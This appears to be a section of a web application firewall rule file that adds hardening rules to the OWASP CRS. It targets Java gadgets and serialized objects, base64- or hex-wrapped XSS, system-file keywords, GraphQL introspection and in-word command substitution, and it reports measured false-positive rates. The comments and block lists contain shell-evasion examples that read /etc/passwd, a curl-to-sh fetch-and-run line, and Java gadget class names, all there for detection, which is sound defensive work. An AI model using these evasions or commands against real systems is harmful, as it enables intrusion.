# -- H2: the remote file inclusion rules also read cookie values ---------------
#
# The level 1 rules by id, not by tag: the tag `attack-rfi` also covers the level 2
# rules 931130 and 931131, which match `scheme://` anywhere in a value (no host
# check), so the consent, auth and shop cookies that hold a URL (OneTrust
# `OptanonConsent` `landingPath=https%3A...`, NextAuth and Auth.js `callback-url`,
# Shopify `_orig_referrer`) would block every request of a site at level 2 and above.
SecRuleUpdateTargetById 931100 931110 931120 "REQUEST_COOKIES"

# -- J1: Java gadget classes (X2-03) -------------------------------------------
#
# KEEP: CRS rule 944130 matches the 81 entries of java-classes.data, which lacks
# the gadgets below (the data file is a fetched, pinned tree and is not edited).
# This is a `deny` rule on purpose, not an anomaly-scoring rule; see the order
# note above. Expected false positives: a Java stack trace or class name pasted
# into a parameter (`sun.misc.Unsafe`, `class.protectionDomain`).
SecRule ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|!REQUEST_HEADERS:Cookie|XML:/*|XML://@* \
    "@pm com.sun.rowset.jdbcrowsetimpl org.apache.xalan.xsltc.trax.templatesimpl bsh.interpreter groovy.lang.groovyshell sun.misc.unsafe class.protectiondomain com.mchange.v2.c3p0 org.springframework.context.support.classpathxmlapplicationcontext ch.qos.logback.core.db.jndiconnectionsource" \
    "id:10944130,phase:2,deny,status:403,log,auditlog,t:none,t:lowercase,msg:'Java gadget class',logdata:'Matched Data: %{MATCHED_VAR_NAME}',severity:'CRITICAL',tag:'crs-hardening',tag:'language-java'"

# -- J2: Java serialization magic ----------------------------------------------
#
# The stream header `ac ed 00 05` as raw bytes, as lower or upper case hex, and
# as base64 at the three alignments, in the standard and the URL-safe alphabet.
# CRS 944210 fixes one base64 character that depends on the byte after the magic;
# a real stream continues with 0x73 and encodes as `rO0ABX`. The classes
# `[Q-Za-f]`, `[U-X]` and the one before `s7QAF` list every byte that can follow;
# the last one lists the character at index 62 twice, `+` and `-`.
# Not covered: a base64 value that a space or a line break splits inside the
# magic (a MIME or Apache Commons decoder skips them) and a stream in a multipart
# file part (the Envoy connector refuses file parts with 413; an embedder of the
# engine reads no file content, `FILES_TMP_CONTENT` is unsupported).
SecRule ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|!REQUEST_HEADERS:Cookie|XML:/*|XML://@* \
    "@rx rO0AB[Q-Za-f]|[Kaq6]ztAA[U-X]|[CGKOSWaeimquy26+-]s7QAF|(?i:aced0005)|\xac\xed\x00\x05" \
    "id:10944210,phase:2,deny,status:403,log,auditlog,t:none,msg:'Java serialized object',logdata:'Matched Data: %{MATCHED_VAR_NAME}',severity:'CRITICAL',tag:'crs-hardening',tag:'language-java'"

# -- D1 to D4: payloads wrapped in base64 or hex (X2-04) ----------------------
#
# Chained `deny` rules over the arguments, the cookie values and every header
# but those that carry no free text (and `Authorization`, whose tokens are base64).
# The head of each chain accepts a value that is entirely base64 or hex; only then
# does the child decode the value (`MATCHED_VARS`) and run `@detectXSS` on the
# bytes. A chain works with and without multiphase evaluation.
#   10941100  arguments and headers: base64, standard or URL-safe alphabet, 8 to
#             256 characters, `=` padding, then white space to the end, or one
#             byte that is neither base64, white space nor `%` and at most 64
#             characters after it. A lenient decoder (PHP, Python) skips that byte
#             and reads on, and so does `base64DecodeExt`, the decode of the child
#             (it reads `-` and `_` as `+` and `/`: `base64Decode` stops at the
#             first one). A CR LF or LF inside the value counts as a character of
#             the 256.
#   10941104  cookies: the same head, and a child that decodes with `base64Decode`.
#             Session cookies are random base64, and a value of random bytes reads
#             as a tag about 0.2 percent of the time at these sizes. ASP.NET Core
#             Data Protection cookies (`.AspNetCore.Session=CfDJ8<base64url>`) are
#             base64url: `base64DecodeExt` reads them in full, and 6 of 2,500
#             cookies of 96 to 192 bytes (0.24 percent) were denied, which locks
#             the user out until the cookie expires; `base64Decode` stops at the
#             first `-` or `_` and denied none. The X2 matrix loses no request
#             against `base64DecodeExt` (the same requests bypass); a payload in
#             URL-safe base64 with an early `-` or `_` in a cookie passes (residue).
#   10941101  hex, 8 to 512 characters.
#   10941103  arguments only: base64 with at least one `%2B`, `%2F` or `%3D` left
#             in the value (a client that URL-encodes it twice; the engine decodes
#             an argument once), 1 to 511 characters (an escape counts as one),
#             decoded with `urlDecode` and `base64DecodeExt`. A literal `+` is not
#             accepted: `urlDecode` would turn it into a space. Cookies and headers
#             are not read: Rails and Rack and PHP (`setcookie`) percent-encode
#             base64 session cookies, and the rule denied 9 of 2,500 Rails and 3
#             of 2,500 PHP cookies (random bytes) while it caught no request of
#             the X2 matrix in a cookie or a header; it catches 14, all
#             double-URL-encoded arguments.
# The heads are anchored with `\A` and `\z`. `@rx` is multi-line, so `^` and `$`
# match at every line break, and a value wrapped at 76 columns (GNU `base64`,
# Python's `encodebytes`, Java's MIME encoder, PHP's `chunk_split`) satisfied the
# head one line at a time: the child then decoded all of it, as `base64Decode`
# skips CR and LF, and denied 60 of 100 random files of 16 KiB where the CRS alone
# denies 32.
#
# The length is capped because random bytes decode to something libinjection reads
# as an HTML tag more often the longer they are. Base64 or hex file content in a
# JSON field (an avatar, a document, a mail attachment, a repository file) is
# ordinary traffic: of 50 random files per size, the unchained rules denied 1 of
# 2 KiB, 4 of 4 KiB, 16 of 16 KiB, 44 of 64 KiB and 50 of 256 KiB (the CRS alone
# denies none below 256 KiB). The largest wrapped payload of the X2 matrix is 192
# base64 or 286 hex characters, so the caps are 256 and 512: a random value at the
# cap is denied 0.2 percent of the time (192 bytes of base64) and 0.4 percent (256
# bytes of hex), 1 in 1,000 at 96 bytes, where the caps of 512 and 1,024 gave 0.9
# and 0.9 percent at 384 and 512 bytes. A wrapped payload longer than the cap passes
# (see the residue), and so does a value that holds anything else.
#
# A failed decode leaves the raw value as the operator input (a transformation
# error is skipped, not fatal). `base64Decode` never fails: it stops at the
# first byte outside the alphabet. `hexDecode` fails on an odd length, and the
# raw value of a failed decode is all hex digits, which holds no tag. The system-file
# rule for hex matches the hexadecimal spelling of the tokens instead of decoding:
# a raw `powershell` in a search query must not block.
#
# 10941102 reads every header of the chains' list raw with `@detectXSS`. CRS rule
# 941100 reads `User-Agent` and `Referer` and no other header, so an
# angle-bracket payload in a custom header scored 0; 23 requests of the X2 matrix
# (`<%= `id` %>`, `<meta http-equiv="Set-Cookie" ...>`, a Java XMLDecoder
# document) were caught only because the old hex rule fell back to the raw value.
# The rule costs about 47,800 instructions per request (0.71 percent). Rule 10941103,
# which read every argument, cookie and header, cost 59,300 (0.87 percent), whatever its
# expression; over arguments only it costs about 5,700 (0.08 percent, inside the noise
# of the measure). The cookie rule 10941104 costs about 10,400 (0.15 percent). The junk
# tail and the line break alternative of 10941100 cost nothing measurable.
#
# Measured cost over 36,000 random benign values (JWT segments, base64 and
# hex digests, UUIDs without dashes and session tokens, in an argument, a cookie
# and a header): 0 blocks by the rules below. Those are short values: the file
# uploads above are why the cap exists.
#
# 10942100 and 10942101 (`@detectSQLi` after the decode) are DISABLED. Random
# bytes contain `'#` or `"#` (a quote and a MySQL comment) often enough for
# libinjection to flag 0.15 to 0.18 percent of random base64 and hex tokens: 60
# of 36,000 values, 18 to 21 of 12,000 per location. A session cookie or a CSRF
# token that decodes to such bytes would block one user on every request, and
# one request in about 600 for a per-request token. The 60 come from every kind of
# token (JWT segments, base64, SHA-256, SHA-1 and MD5 digests, UUID hex, session
# ids); 18 are in arguments. Enabling them blocks a base64 or hex wrapped SQL
# injection; remove the leading `#` of the two rules to accept that cost. A
# narrower rule (arguments only, behind a printable-ASCII check of the decoded
# value) needs a chain and waits for the multiphase chain items.
#SecRule ARGS|REQUEST_COOKIES|REQUEST_HEADERS|!REQUEST_HEADERS:Cookie|!REQUEST_HEADERS:Accept|!REQUEST_HEADERS:Accept-Encoding|!REQUEST_HEADERS:Accept-Language|!REQUEST_HEADERS:Host|!REQUEST_HEADERS:Content-Type|!REQUEST_HEADERS:Content-Length|!REQUEST_HEADERS:Authorization \
#    "@detectSQLi" \
#    "id:10942100,phase:2,deny,status:403,log,auditlog,t:none,t:base64Decode,msg:'SQL injection in a base64-decoded value',logdata:'Matched Data: %{MATCHED_VAR_NAME}',severity:'CRITICAL',tag:'crs-hardening',tag:'attack-sqli'"
#SecRule ARGS|REQUEST_COOKIES|REQUEST_HEADERS|!REQUEST_HEADERS:Cookie|!REQUEST_HEADERS:Accept|!REQUEST_HEADERS:Accept-Encoding|!REQUEST_HEADERS:Accept-Language|!REQUEST_HEADERS:Host|!REQUEST_HEADERS:Content-Type|!REQUEST_HEADERS:Content-Length|!REQUEST_HEADERS:Authorization \
#    "@detectSQLi" \
#    "id:10942101,phase:2,deny,status:403,log,auditlog,t:none,t:hexDecode,msg:'SQL injection in a hex-decoded value',logdata:'Matched Data: %{MATCHED_VAR_NAME}',severity:'CRITICAL',tag:'crs-hardening',tag:'attack-sqli'"

SecRule ARGS|REQUEST_HEADERS|!REQUEST_HEADERS:Cookie|!REQUEST_HEADERS:Accept|!REQUEST_HEADERS:Accept-Encoding|!REQUEST_HEADERS:Accept-Language|!REQUEST_HEADERS:Host|!REQUEST_HEADERS:Content-Type|!REQUEST_HEADERS:Content-Length|!REQUEST_HEADERS:Authorization \
    "@rx \A(?:[A-Za-z0-9+/_-]|\r?\n){8,256}={0,2}(?:\s*\z|[^A-Za-z0-9+/=_%\s-].{0,64}\z)" \
    "id:10941100,phase:2,deny,status:403,log,auditlog,t:none,msg:'XSS in a base64-decoded value',logdata:'Matched Data: %{MATCHED_VAR_NAME}',severity:'CRITICAL',tag:'crs-hardening',tag:'attack-xss',chain"
    SecRule MATCHED_VARS "@detectXSS" "t:none,t:base64DecodeExt"
SecRule REQUEST_COOKIES \
    "@rx \A(?:[A-Za-z0-9+/_-]|\r?\n){8,256}={0,2}(?:\s*\z|[^A-Za-z0-9+/=_%\s-].{0,64}\z)" \
    "id:10941104,phase:2,deny,status:403,log,auditlog,t:none,msg:'XSS in a base64-decoded cookie',logdata:'Matched Data: %{MATCHED_VAR_NAME}',severity:'CRITICAL',tag:'crs-hardening',tag:'attack-xss',chain"
    SecRule MATCHED_VARS "@detectXSS" "t:none,t:base64Decode"
SecRule ARGS|REQUEST_COOKIES|REQUEST_HEADERS|!REQUEST_HEADERS:Cookie|!REQUEST_HEADERS:Accept|!REQUEST_HEADERS:Accept-Encoding|!REQUEST_HEADERS:Accept-Language|!REQUEST_HEADERS:Host|!REQUEST_HEADERS:Content-Type|!REQUEST_HEADERS:Content-Length|!REQUEST_HEADERS:Authorization \
    "@rx \A[0-9A-Fa-f]{8,512}\z" \
    "id:10941101,phase:2,deny,status:403,log,auditlog,t:none,msg:'XSS in a hex-decoded value',logdata:'Matched Data: %{MATCHED_VAR_NAME}',severity:'CRITICAL',tag:'crs-hardening',tag:'attack-xss',chain"
    SecRule MATCHED_VARS "@detectXSS" "t:none,t:hexDecode"
SecRule REQUEST_HEADERS|!REQUEST_HEADERS:Cookie|!REQUEST_HEADERS:Accept|!REQUEST_HEADERS:Accept-Encoding|!REQUEST_HEADERS:Accept-Language|!REQUEST_HEADERS:Host|!REQUEST_HEADERS:Content-Type|!REQUEST_HEADERS:Content-Length|!REQUEST_HEADERS:Authorization \
    "@detectXSS" \
    "id:10941102,phase:2,deny,status:403,log,auditlog,t:none,msg:'XSS in a request header',logdata:'Matched Data: %{MATCHED_VAR_NAME}',severity:'CRITICAL',tag:'crs-hardening',tag:'attack-xss'"
SecRule ARGS \
    "@rx \A[A-Za-z0-9/_-]{0,255}%(?:2[BbFf]|3[Dd])(?:[A-Za-z0-9/_-]|%2[BbFf]|%3[Dd]){0,255}={0,2}\z" \
    "id:10941103,phase:2,deny,status:403,log,auditlog,t:none,msg:'XSS in a percent-encoded base64-decoded value',logdata:'Matched Data: %{MATCHED_VAR_NAME}',severity:'CRITICAL',tag:'crs-hardening',tag:'attack-xss',chain"
    SecRule MATCHED_VARS "@detectXSS" "t:none,t:urlDecode,t:base64DecodeExt"
# 10930120 decodes with `base64DecodeExt`, like the XSS child of 10941100: a system file in URL-safe base64
# with an early `-` or `_`, or with a junk byte inside the value, is read (197 more requests of the X2
# matrix). Unlike the XSS rules it has no head, and it reads cookies as well: the operator matches six
# fixed strings of at least six bytes, so random cookies do not match (0 of 10,000 session cookies).
SecRule ARGS|REQUEST_COOKIES|REQUEST_HEADERS|!REQUEST_HEADERS:Cookie|!REQUEST_HEADERS:Accept|!REQUEST_HEADERS:Accept-Encoding|!REQUEST_HEADERS:Accept-Language|!REQUEST_HEADERS:Host|!REQUEST_HEADERS:Content-Type|!REQUEST_HEADERS:Content-Length|!REQUEST_HEADERS:Authorization \
    "@pm /etc/passwd /etc/shadow /bin/sh /bin/bash cmd.exe powershell" \
    "id:10930120,phase:2,deny,status:403,log,auditlog,t:none,t:base64DecodeExt,msg:'System command or file in a base64-decoded value',logdata:'Matched Data: %{MATCHED_VAR_NAME}',severity:'CRITICAL',tag:'crs-hardening',tag:'attack-rce'"
# The hexadecimal spelling of /etc/passwd, /etc/shadow, /bin/sh, /bin/bash, cmd.exe and powershell.
SecRule ARGS|REQUEST_COOKIES|REQUEST_HEADERS|!REQUEST_HEADERS:Cookie|!REQUEST_HEADERS:Accept|!REQUEST_HEADERS:Accept-Encoding|!REQUEST_HEADERS:Accept-Language|!REQUEST_HEADERS:Host|!REQUEST_HEADERS:Content-Type|!REQUEST_HEADERS:Content-Length|!REQUEST_HEADERS:Authorization \
    "@pm 2f6574632f706173737764 2f6574632f736861646f77 2f62696e2f7368 2f62696e2f62617368 636d642e657865 706f7765727368656c6c" \
    "id:10930121,phase:2,deny,status:403,log,auditlog,t:none,t:lowercase,msg:'System command or file in a hex-encoded value',logdata:'Matched Data: %{MATCHED_VAR_NAME}',severity:'CRITICAL',tag:'crs-hardening',tag:'attack-rce'"

# -- G1: GraphQL introspection (X2-05) -----------------------------------------
#
# `__schema` and `__type` as a word. `__typename`, which GraphQL clients add to
# every query, does not match. The query is read from the `query` argument (a
# GET or form parameter, or the `query` field of a JSON body, which the JSON
# processor names `json.query`) and from a body of type `application/graphql`,
# which has no body processor: rule 10934902 makes the engine keep it in
# REQUEST_BODY. The CRS refuses that content type (rule 920420) unless the
# setup file allows it. A batch, a JSON array of operations, names its fields
# `json.0.query`, `json.1.query`.
# Argument names are not read: a JSON key or a form field named `__type` is a type
# hint (Parse Server `{"__type":"Pointer",...}`, ASP.NET AJAX and WCF
# `"__type":"Customer:#NS"`), not a query, and a rule that read names would deny
# every request of those APIs. The price: a query sent as a parameter name or as a
# JSON key (`?{__schema{types{name}}}=1`) is not read; 108 of the 273,618 requests
# of the X2 matrix, the `graphql` class goes from 68.7 to 71.0 percent bypass.
# Not covered: query depth and alias limits (they need a GraphQL-aware operator or
# body processor), an `operations` field of a multipart request, a query nested
# below another JSON key, a query in an argument name or a JSON key, and a query
# sent in a file part (see J2).
SecRule ARGS:/^(?:json\.(?:\d+\.)?)?query$/ "@rx (?i)\b__(?:schema|type)\b" \
    "id:10934900,phase:2,deny,status:403,log,auditlog,t:none,msg:'GraphQL introspection',logdata:'Matched Data: %{MATCHED_VAR_NAME}',severity:'CRITICAL',tag:'crs-hardening',tag:'language-graphql'"
SecRule REQUEST_HEADERS:Content-Type "@beginsWith application/graphql" \
    "id:10934902,phase:1,pass,nolog,t:none,t:lowercase,ctl:forceRequestBodyVariable=On"
SecRule REQUEST_HEADERS:Content-Type "@beginsWith application/graphql" \
    "id:10934901,phase:2,deny,status:403,log,auditlog,t:none,t:lowercase,msg:'GraphQL introspection',logdata:'Matched Data: %{MATCHED_VAR_NAME}',severity:'CRITICAL',tag:'crs-hardening',tag:'language-graphql',chain"
    SecRule REQUEST_BODY "@rx (?i)\b__(?:schema|type)\b" "t:none"

# -- 10932130: a command substitution inside a word ---------------------------
#
# A substitution that prints nothing, written inside a word, hides a command
# from the CRS (the CRS reads `c`~`at` as a word of its own): in bash,
# ;c`~`at /e`~`tc/pa`~`sswd  and  ;c`:`at ...  and  ;c`true`at ...  and
# ;c$()at ...  and  ;c` `at ...  all run `cat /etc/passwd`, and they pass the CRS
# at level 1.
# The shape is a word, a substitution and a word, with nothing between them. The
# substitution is a pair of backticks or `$(...)` that hold up to 24 word
# characters, `~`, `:` and quotes, or only blanks. The word on the left must not
# follow a backtick: two code spans joined by one character (`ARGS_GET`:`x`,
# `db`.`t`) are not a word and a substitution.
# Not covered, because the content would match prose: a substitution that holds
# `.`, `-`, `;`, `$x` or a longer command (;c`.`at, ;c`-`at, ;c`:;`at, ;c`$x`at).
# Not covered, because the match would lock users out: an empty `$@` or `$*` inside
# a word (;c$@at ...). A password manager draws `$@` or `$*` in 0.1 to 0.9 percent of
# its 12 to 32 character passwords (the 8-symbol set `!@#$%^&*`, or all 32
# punctuation characters; 0 with letters and digits only), and the shape is one
# of many empty expansions that already pass (`c$9at`, `c${x}at`, `c$x`).
# Known false positive: a generated password (or any value) that holds a pair of
# backticks around word characters or nothing, or `$(` and `)` around them
# (`4Y``maXQ"Jva_UKG`). Measured on 20,000 form and JSON logins with 16-character
# passwords at level 1: 0 of 10,000 drawn from the 8-symbol set (no backtick, no
# `(`), 20 of 10,000 (0.20 percent) drawn from all 32 punctuation characters, where
# the CRS alone blocks 204 (2.04 percent) of the same logins.
SecRule ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_HEADERS|!REQUEST_HEADERS:Cookie|!REQUEST_HEADERS:Accept|!REQUEST_HEADERS:Accept-Encoding|!REQUEST_HEADERS:Accept-Language|!REQUEST_HEADERS:Host|!REQUEST_HEADERS:Content-Type|!REQUEST_HEADERS:Content-Length|!REQUEST_HEADERS:Authorization|XML:/*|XML://@* \
    "@rx (?:^|[^`0-9A-Za-z_./-])[0-9A-Za-z_./-]*[0-9A-Za-z_](?:`(?:[0-9A-Za-z_~:\x22\x27]{0,24}|[ \t]+)`|\$\((?:[0-9A-Za-z_~:\x22\x27]{0,24}|[ \t]+)\))[0-9A-Za-z_]" \
    "id:10932130,phase:2,deny,status:403,log,auditlog,t:none,t:urlDecodeUni,msg:'Command substitution inside a word',logdata:'Matched Data: %{MATCHED_VAR_NAME}',severity:'CRITICAL',tag:'crs-hardening',tag:'attack-rce'"

# -- 10932235: the User-Agent for rule 932235, except Composer's -------------
#
# Rule 932235 (a Unix command without evasion) matches `cURL 8.5.0` in the
# `User-Agent` of every Composer (the PHP package manager) and blocks it: H1
# excludes the `User-Agent` from 932235 above. A `User-Agent` that holds a command
# (`;curl 203.0.113.9/s|sh`) would then pass 932235, and the `User-Agent` of the X2
# matrix bypasses 89.2 percent of the time with the CRS alone, 65.2 percent with
# this exclusion alone and 60.0 with the rule below. So this rule runs a copy of
# 932235's operator over the `User-Agent` and skips a value that has Composer's
# strict shape: `Composer/<version> (<system>; <kernel>; PHP <version>; cURL
# <version>|streams[; Platform-PHP <version>][; CI][; Docker])`. The kernel field
# allows letters, digits and `._+~-` only, so a command appended to the shape, or
# put in a field, does not have the shape and is read. The score is the one of
# 932235 (critical, the rce score, paranoia level 1).
#
# It is a scoring rule in phase 1, placed after the CRS: phase 1 runs after rule
# 901200 resets the score and before rule 949110 (phase 2) reads it, in both
# evaluation modes. (A `ctl` after the CRS is too late under multiphase evaluation,
# and a scoring rule in phase 2 after the CRS is not read without it.) Without
# the CRS there is no score to add and the rule has no effect.
#
# The operator is a copy of the CRS's own. A test in envoy-coraza compares it with
# rule 932235 of the embedded CRS, so a CRS update that changes 932235 fails it
# until the copy is regenerated. A tuning that removes 932235 (`SecRuleRemoveById
# 932235`, `ctl:ruleRemoveById=932235`) does not remove this copy: remove 10932235
# as well, or `ctl:ruleRemoveTargetById=10932235;REQUEST_HEADERS:User-Agent` for one
# path.
